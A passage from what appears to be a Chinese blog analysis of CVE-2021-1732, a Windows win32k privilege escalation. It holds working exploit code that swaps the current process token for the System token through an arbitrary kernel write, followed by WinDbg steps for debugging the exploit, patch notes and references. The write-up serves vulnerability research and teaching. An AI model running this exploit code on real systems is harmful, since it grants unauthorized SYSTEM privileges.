循环遍历更优</span></span><br><span class="line">    <span class="built_in">ReadKernelMemoryQQWORD</span>(pNextEProcess + g_dwEPROCESS_ActiveProcessLinks_offset, ululValue1, ululValue2);	<span class="comment">// 读出 pEPROCESS-&gt;ActiveProcessLinks.Flink 的值</span></span><br><span class="line">    pNextEProcess = ululValue1 - g_dwEPROCESS_ActiveProcessLinks_offset;	<span class="comment">// 减去 ActiveProcessLinks 字段在 EPROCESS 结构体中的偏移，得到下一个进程 EPROCESS 结构体首地址</span></span><br><span class="line">    <span class="comment">// 读取下一个进程 pid</span></span><br><span class="line">    <span class="built_in">ReadKernelMemoryQQWORD</span>(pNextEProcess + g_dwEPROCESS_UniqueProcessId_offset, ululValue1, ululValue2);</span><br><span class="line"></span><br><span class="line">    ULONG_PTR nProcessId = ululValue1;</span><br><span class="line">    <span class="keyword">if</span> (nProcessId == <span class="number">4</span>) &#123; <span class="comment">// pid 为 4，说明找到了 System 进程</span></span><br><span class="line">        pSystemEProcess = pNextEProcess;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;System kernel eprocess: &quot;</span> &lt;&lt; std::hex &lt;&lt; pSystemEProcess &lt;&lt; std::endl;	<span class="comment">// 输出信息</span></span><br><span class="line">        <span class="comment">// 读取 System 进程的 Token</span></span><br><span class="line">        <span class="built_in">ReadKernelMemoryQQWORD</span>(pSystemEProcess + g_dwEPROCESS_Token_offset, ululValue1, ululValue2);</span><br><span class="line">        ULONG_PTR pSystemToken = ululValue1;</span><br><span class="line"></span><br><span class="line">        ULONG_PTR pMyEProcessToken = pMyEProcess + g_dwEPROCESS_Token_offset;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 参考 3.6.1 节，通过任意地址写，替换当前进程的 Token 为 System Token</span></span><br><span class="line">        LONG_PTR old = <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pMyEProcessToken);	<span class="comment">// 修改 tagWNDk1.pExtraBytes 为当前进程 &amp;pEPROCESS-&gt;Token</span></span><br><span class="line">        <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">1</span>], <span class="number">0</span>, (LONG_PTR)pSystemToken);  <span class="comment">// 窗口 1 的 pExtraBytes 处于直接寻址模式</span></span><br><span class="line">        <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)old);		<span class="comment">// 还原 tagWNDk1.pExtraBytes 旧值</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<br>

<h3 id="扫尾工作"><a href="#扫尾工作" class="headerlink" title="扫尾工作"></a>扫尾工作</h3><p>350 - 374 行恢复了被修改的各结构体字段，防止蓝屏的发生：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">g_dwpWndKernel_heap_offset2 = *(ULONG_PTR*)((PBYTE)pWnd2 + g_dwKernel_pWnd_offset);	<span class="comment">// tagWNDk2 相对于桌面堆基址的偏移</span></span><br><span class="line">ULONG_PTR dwpWnd0_to_pWnd2_kernel_heap_offset = *(ULONGLONG*)((PBYTE)g_pWnd[<span class="number">0</span>] + <span class="number">0x128</span>);	<span class="comment">// tagWNDk0 在桌面堆上的扩展内存相对于桌面堆基址的偏移</span></span><br><span class="line"><span class="keyword">if</span> (dwpWnd0_to_pWnd2_kernel_heap_offset &lt; g_dwpWndKernel_heap_offset2) &#123;	<span class="comment">// tagWNDk2 需在二者中较高的地址</span></span><br><span class="line">    dwpWnd0_to_pWnd2_kernel_heap_offset = (g_dwpWndKernel_heap_offset2 - dwpWnd0_to_pWnd2_kernel_heap_offset);	<span class="comment">// 计算二者的偏移</span></span><br><span class="line">    <span class="comment">// 去掉 ptagWNDk2-&gt;dwExtraFlag 的 0x800 属性，pExtraBytes 改回直接寻址模式</span></span><br><span class="line">    DWORD dwFlag = *(ULONGLONG*)((PBYTE)pWnd2 + g_dwModifyOffsetFlag_offset);</span><br><span class="line">    dwFlag &amp;= ~<span class="number">0x800</span>;</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffsetFlag_offset, dwFlag);</span><br><span class="line">    <span class="comment">// 在用户空间堆中申请一片空间来赋值 ptagWNDk2-&gt;pExtraBytes</span></span><br><span class="line">    PVOID pAlloc = <span class="built_in">g_fRtlAllocateHeap</span>((PVOID) * (ULONG_PTR*)(__readgsqword(<span class="number">0x60</span>) + <span class="number">0x30</span>), <span class="number">0</span>, g_dwMyWndExtra);</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd2_kernel_heap_offset + g_dwModifyOffset_offset, (LONG_PTR)pAlloc);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还原 ptagWNDk1-&gt;spMenu 时，ptagWNDk1-&gt;dwStyle 需要带有 WS_CHILD 属性</span></span><br><span class="line">    ULONGLONG ululStyle = *(ULONGLONG*)((PBYTE)g_pWnd[<span class="number">1</span>] + g_dwExStyle_offset);</span><br><span class="line">    ululStyle |= <span class="number">0x4000000000000000</span>L;</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);	<span class="comment">// 为窗口 1 添加 WS_CHILD 样式</span></span><br><span class="line">    <span class="comment">// 使用 SetWindowLongPtr 自带功能（-12）还原 ptagWNDk1-&gt;spMenu</span></span><br><span class="line">    ULONG_PTR pMyMenu = <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">1</span>], GWLP_ID, (LONG_PTR)pSPMenu);</span><br><span class="line">    <span class="comment">// 这里应该释放伪造 tagMENU 时申请的那些空间，因为没有后续利用，写不写倒是无所谓</span></span><br><span class="line">    <span class="comment">// 移除窗口 1 的 WS_CHILD 样式</span></span><br><span class="line">    ululStyle &amp;= ~<span class="number">0x4000000000000000</span>L;</span><br><span class="line">    <span class="built_in">SetWindowLongPtr</span>(g_hWnd[<span class="number">0</span>], dwpWnd0_to_pWnd1_kernel_heap_offset + g_dwExStyle_offset, ululStyle);</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Recovery bug prevent blue screen.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>376 - 388 行释放剩余的资源，EXP 至此结束：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">DestroyWindow</span>(g_hWnd[<span class="number">0</span>]);</span><br><span class="line"><span class="built_in">DestroyWindow</span>(g_hWnd[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">DestroyWindow</span>(hWnd2);</span><br><span class="line"><span class="comment">// 232、233 行创建的两个菜单还没有释放！</span></span><br><span class="line"><span class="keyword">if</span> (pSystemEProcess != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;CVE-2021-1732 Exploit success, system permission&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;CVE-2021-1732 Exploit fail&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">int</span>)<span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<br>

<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="双机调试环境搭建-20"><a href="#双机调试环境搭建-20" class="headerlink" title="双机调试环境搭建[20]"></a>双机调试环境搭建<sup>[20]</sup></h3><p>确保你有一个 Win10 1809 的虚拟机，如果没有，可以参考 <strong>2.1 节</strong>。</p>
<p>接着从 github 下载最新版 VirtualKD-Redux<sup>[21]</sup>：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/two_machine_debug/1.png" alt="1"></p>
<p>解压后将 <strong>target64 文件夹</strong>复制到虚拟机内，在虚拟机里以管理员身份运行文件夹中的 <strong>vminstall.exe</strong>，点击 Install 按钮：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/two_machine_debug/2.png" alt="2"></p>
<p>弹出的警告无视掉，然后重启虚拟机（选<strong>是</strong>会自动重启）。启动界面会让你选择启动项，选到我们新加的启动项<strong>按下 F8</strong>，选择<strong>禁用驱动程序强制签名</strong>并按下回车：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/two_machine_debug/3.png" alt="3"></p>
<p>等待进入桌面后（<strong>建议重新拍摄一个快照</strong>），在<strong>宿主机</strong>中运行 VirtualKD-Redux 文件夹下的 <strong>vmmon64.exe</strong>，设置 WinDbg 调试器的路径（如果没有安装 WinDbg，可以参考微软官方文档<sup>[22]</sup>）：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/two_machine_debug/4.png" alt="4"></p>
<p>点击 Run debugger 就会弹出 WinDbg（以后再调试都会自动弹出），按 WinDbg 上方的暂停按键就可以断下来了：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/two_machine_debug/5.png" alt="5"></p>
<p>下方命令行输入 g，虚拟机就可以继续运行了，<strong>后面再想中断，可以按 WinDbg 上方的暂停按键</strong>。</p>
<p>最后是设置 WinDbg 使用的符号路径<sup>[23]</sup>，需要添加一个 _NT_SYMBOL_PATH 系统环境变量，值为 <code>srv*path</code></p>
<p><code>to\your\local\folder*https://msdl.microsoft.com/download/symbols</code>，两个星号中间部分替换为你的本地文件夹（WinDbg 将自动从微软符号服务器下载 pdb 文件到这个文件夹中）：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/two_machine_debug/6.png" alt="6"></p>
<p><strong>重启 WinDbg 后生效</strong>。</p>
<br>

<h3 id="IDA-加载-pdb-文件"><a href="#IDA-加载-pdb-文件" class="headerlink" title="IDA 加载 pdb 文件"></a>IDA 加载 pdb 文件</h3><p>以 ExploitTest.exe 为例，使用 IDA 加载  ExploitTest.exe 后，选择上方的 File -&gt; Load file -&gt; PDB file，选择 pdb 路径：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/ida_load_pdb/1.png" alt="1"></p>
<p>加载完毕后，左侧函数窗口就能看到符号了：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/ida_load_pdb/2.png" alt="2"></p>
<br>

<h3 id="调试某一进程"><a href="#调试某一进程" class="headerlink" title="调试某一进程"></a>调试某一进程</h3><p>以 ExploitTest.exe 为例，在虚拟机中运行 ExploitTest.exe ，WinDbg 中按下暂停后首先找到进程的 EPROCESS 地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0 ExploitTest.exe</span><br><span class="line">PROCESS ffffc90f5867c080</span><br><span class="line">    SessionId: 1  Cid: 08c0    Peb: 00298000  ParentCid: 0eb8</span><br><span class="line">    DirBase: 62300002  ObjectTable: ffffdd89449bd940  HandleCount:  56.</span><br><span class="line">    Image: ExploitTest.exe</span><br></pre></td></tr></table></figure>

<p>使用 .process 指令与找到的 EPROCESS 地址切换到该进程的地址空间：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; .process /i /p ffffc90f5867c080</span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br></pre></td></tr></table></figure>

<p>然后 g 运行一下，WinDbg 会切换进程并断在 ExploitTest.exe 进程中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff801`10dc7cc0 cc              int     3</span><br></pre></td></tr></table></figure>

<p>最后重新加载符号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !sym noisy</span><br><span class="line">noisy mode - symbol prompts on</span><br><span class="line"></span><br><span class="line">kd&gt; .reload /f</span><br><span class="line">Loading User Symbols</span><br><span class="line">... 等待其从微软符号服务器下载符号</span><br></pre></td></tr></table></figure>

<p>可以看到加载了的模块都有对应的 pdb 了：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/debug_process/1.png" alt="1"></p>
<p>现在就可以：</p>
<ol>
<li>根据 IDA 上看到的地址来下断点（之前编译的时候已经关闭了随机基址，参考 <strong>2.2 节</strong>）</li>
<li>加载源码进行调试</li>
</ol>
<p>对于第二种调试方法，选择 WinDbg 上方 File -&gt; Open Source File，加载 CVE-2021-1732_Exploit.cpp，即可在源码窗口下断点：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/debug_process/2.png" alt="2"></p>
<br>

<h3 id="获取-pdb-文件"><a href="#获取-pdb-文件" class="headerlink" title="获取 pdb 文件"></a>获取 pdb 文件</h3><p>对于调试过程中被调试进程已经加载了的模块，可以通过 <code>.reload /f</code> 指令来下载（上一部分已提及）。想要获得未加载模块的 pdb 文件，可以先在虚拟机中找到该模块，将其复制到宿主机中，再通过 WinDbg 同级目录下的 symchk.exe 来下载。</p>
<p>以 win32kfull.sys 为例，该驱动位于 C:\Windows\System32 目录下：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/get_pdb_file/1.png" alt="1"></p>
<p>拷贝到宿主机后，找到 WinDbg 所在目录，使用 symchk 并指定 win32kfull.sys 路径：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/get_pdb_file/2.png" alt="2"></p>
<p>之后就能在符号缓存目录下找到 pdb 了：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/get_pdb_file/3.png" alt="3"></p>
<br>

<h3 id="exp-关键点动态调试"><a href="#exp-关键点动态调试" class="headerlink" title="exp 关键点动态调试"></a>exp 关键点动态调试</h3><blockquote>
<p>挂钩 user32!_xxxClientAllocWindowClassExtraBytes</p>
</blockquote>
<p>202 行下断点，运行到此处，先查看原 KernelCallbackTable[123] 表项，其指向 user32!_xxxClientAllocWindowClassExtraBytes：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/1.png" alt="1"></p>
<p>步过后，该项被改为我们的挂钩函数：<br><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/2.png" alt="2"></p>
<br>

<blockquote>
<p>内存布局情况</p>
</blockquote>
<p>运行到 286 行，在 <code>win32kfull!xxxCreateWindowEx+1182</code> 下个断点，r15 为 tagWND2 的地址（IDA 查看函数偏移可以在 Options -&gt; General 中勾选 Function offsets）：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/3.png" alt="3"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/4.png" alt="4"></p>
<p>访问 <code>*(*(&amp;tagWND + 0x18) + 0x80)</code> 得到桌面堆基址 0xffff892a81000000：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/5.png" alt="5"></p>
<p>通过 EXP 的 g_pwnd 数组 0、1 两项可以获取到 tagWNDk0、tagWNDk1 相对于桌面堆的偏移：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/6.png" alt="6"></p>
<p>故 tagWNDk0 地址为 0xffff892a81030bc0，tagWNDk1 地址为 0xffff892a81033b10，tagWNDk2 地址为 0xffff892a81033c60。继续运行到执行流返回 EXP 的 287 行，现在窗口 0 和窗口 2 的 pExtraBytes 均处于 offset 间接寻址模式，来看看他们的扩展内存在哪里：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/7.png" alt="7"></p>
<p>可以看到，窗口 0 的扩展内存处于较低的地址，窗口 2 的扩展内存语义上指向了 tagWNDk0 ，这样的内存布局正符合我们的期望：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/8.png" alt="8"></p>
<br>

<blockquote>
<p>泄露 EPROCESS 地址</p>
</blockquote>
<p>运行到 293 行，在 <code>win32kfull!xxxSetWindowLongPtr</code> 下断点，第一个参数为 tagWND0 的地址，保存在 rcx 寄存器：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/9.png" alt="9"></p>
<p>运行到 306 行，同样在 <code>win32kfull!xxxSetWindowLongPtr</code> 下断点，第一个参数为 tagWND1 的地址，同样保存在 rcx 寄存器：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/10.png" alt="10"></p>
<p>tagWND1 原来的 spMenu：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/11.png" alt="11"></p>
<p>继续执行直到执行流返回 309 行，tagWND1.spMenu 就被修改为指向我们伪造的 tagMENU 结构体了：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/12.png" alt="12"></p>
<p>接着 EXP 会通过三次 GetMenuBarInfo 来泄露进程 EPROCES 地址，让程序运行到读取完毕的 320 行，验证地址的正确性：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/13.png" alt="13"></p>
<br>

<blockquote>
<p>权限提升</p>
</blockquote>
<p>让程序执行到 339 行，验证找到的 System 进程 EPROCESS 地址：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/14.png" alt="14"></p>
<p>可以得知 System Token 为 <strong>0xffff9209cb20604a</strong>，且此时 tagWNDk1.pExtraBytes 处于直接寻址模式：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/15.png" alt="15"></p>
<p>当前进程原来的 Token 为 0xffff9209d2acc067：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/16.png" alt="16"></p>
<p>执行到 350 行（使用任意地址写能力修改当前进程 Token 结束后），再查看当前进程的 Token：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/debugging/exp_debug/17.png" alt="17"></p>
<p>成功更换令牌，实现提权。</p>
<br>

<h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>由于官网<sup>[24]</sup>上的补丁包我打不上，索性就用已经打满补丁的（4 月的包也更新了）Windows10 20H2 x64 宿主机来看吧，补丁打在了 win32kfull!xxxCreateWindowEx：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/img/article/20220104/patch_analyze/1.png" alt="1"></p>
<br>

<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>完结撒花，感谢你耐心的阅读！如果前面的每个部分都细看了，那么相信现在你已经对 CVE 2021-1732 了若指掌了，恭喜你！同时也特别感谢 Kernel Killer 的 EXP 开发文档<sup>[5]</sup> 和 iamelli0t 的漏洞分析博客<sup>[12]</sup>，这两篇文章数次拯救我于水深火热（大脑短路）之中。除此之外，我还推荐一篇奇安信威胁情报中心发的文章<sup>[10]</sup>，其作者详细分析了在野攻击样本，满篇的动态调试弥补了本文动调方面的不足。</p>
<p>其实一开始我还想拿一个版块来写 KaLendsi<sup>[4]</sup> 的 EXP 分析，奈何本人精力有限，这篇不到 16000 字的 CVE 分析已经耗费了我大量的心血，虽然这可能与我第一次做 Windows 内核漏洞利用的分析有关（笑）。从有写这篇文章的想法，到拙作收笔，期间的时空跨度很大，时间上，各种参考文献的查找、阅读就花掉了半个月，剩下半个月一半时间在静态分析各个模块和调试 EXP，另一半用来没日没夜地写作；空间上，随着宛如甘霖的 5.1 假期到来，我从呆了一年的学校回到了心心念念的家中……总之，如果你阅读了 KaLendsi 的 EXP，劳烦你告知我他的做法，谢谢！而如果你有心去阅读 KaLendsi 的 EXP，本文已经给你提供了足够的能力，也希望你读懂后能与我交流 ~</p>
<p>最后我想说，即使校对了 3 遍，我还是不能打包票 —— 本文不存在笔误，毕竟我在各参考文献中就发现了不少的错误，这一点望读者海涵。如果我哪里写错而误导了你，请务必告知我，届时求轻喷 555</p>
<br>

<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>[1] <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1732">MSRC: Windows Win32k 特权提升漏洞公告</a></p>
<p>[2] <a target="_blank" rel="noopener" href="https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack-cn/">0Day攻击！首次发现蔓灵花组织在针对国内的攻击活动中使用Windows内核提权0Day漏洞（CVE-2021-1732）</a></p>
<p>[3] <a target="_blank" rel="noopener" href="https://github.com/k-k-k-k-k/CVE-2021-1732">Github: k-k-k-k-k/CVE-2021-1732</a></p>
<p>[4] <a target="_blank" rel="noopener" href="https://github.com/KaLendsi/CVE-2021-1732-Exploit">Github: KaLendsi/CVE-2021-1732-Exploit</a></p>
<p>[5] <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-266362.htm">[原创]CVE-­2021­-1732 Microsoft Windows10 本地提权漏洞研究及Exploit开发</a></p>
<p>[6] <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-wndclassexa?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINUSER%252FWNDCLASSEXA);k(WNDCLASSEXA);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue">WNDCLASSEXA structure (winuser.h)</a></p>
<p>[7] <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-createwindowexw">CreateWindowExW function (winuser.h)</a></p>
<p>[8] <a target="_blank" rel="noopener" href="https://www.programmersought.com/article/89797235329/">Win10 tagWnd partial member reverse (window hidden, window protected)</a></p>
<p>[9] <a target="_blank" rel="noopener" href="https://www.fuzzysecurity.com/tutorials/expDev/22.html">Part 18: Kernel Exploitation -&gt; RS2 Bitmap Necromancy</a></p>
<p>[10] <a target="_blank" rel="noopener" href="https://www.secrss.com/articles/29758">Microsoft Windows提权漏洞 (CVE-2021-1732) 分析</a></p>
<p>[11] <a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-104918.htm">[原创]KeUserModeCallback用法详解</a></p>
<p>[12] <a target="_blank" rel="noopener" href="https://iamelli0t.github.io/2021/03/25/CVE-2021-1732.html">CVE-2021-1732: win32kfull xxxCreateWindowEx callback out-of-bounds</a></p>
<p>[13] <a target="_blank" rel="noopener" href="https://blog.csdn.net/iiprogram/article/details/1494927">Windows源代码阅读之 句柄算法</a></p>
<p>[14] <a target="_blank" rel="noopener" href="https://theevilbit.github.io/posts/a_simple_protection_against_hmvalidatehandle_technique/">A simple protection against HMValidateHandle technique</a></p>
<p>[15] <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-getmenubarinfo?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINUSER%252FGetMenuBarInfo);k(GetMenuBarInfo);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue">GetMenuBarInfo function (winuser.h)</a></p>
<p>[16] <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/ns-winuser-menubarinfo?f1url=%3FappId%3DDev16IDEF1%26l%3DZH-CN%26k%3Dk(WINUSER%252FPMENUBARINFO);k(PMENUBARINFO);k(DevLang-C%252B%252B);k(TargetOS-Windows)%26rd%3Dtrue">MENUBARINFO structure (winuser.h)</a></p>
<p>[17] <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows/win32/api/winuser/nf-winuser-setwindowlongptrw">SetWindowLongPtrW function (winuser.h)</a></p>
<p>[18] <a target="_blank" rel="noopener" href="https://blog.csdn.net/pureman_mega/article/details/78907058">通过ActiveProcessLinks遍历进程</a></p>
<p>[19] <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32619837/article/details/90711736">使用AllocConsole在Win32程序中调用控制台调试输出</a></p>
<p>[20] <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/114538001">使用VMware + win10 + VirtualKD + windbg从零搭建双机内核调试环境</a></p>
<p>[21] <a target="_blank" rel="noopener" href="https://github.com/4d61726b/VirtualKD-Redux/releases">Github: VirtualKD-Redux/release</a></p>
<p>[22] <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools">下载 Windows 调试工具</a></p>
<p>[23] <a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/using-a-symbol-server">使用符号服务器</a></p>
<p>[24] <a target="_blank" rel="noopener" href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4601345">Microsoft Update Catalog</a></p>
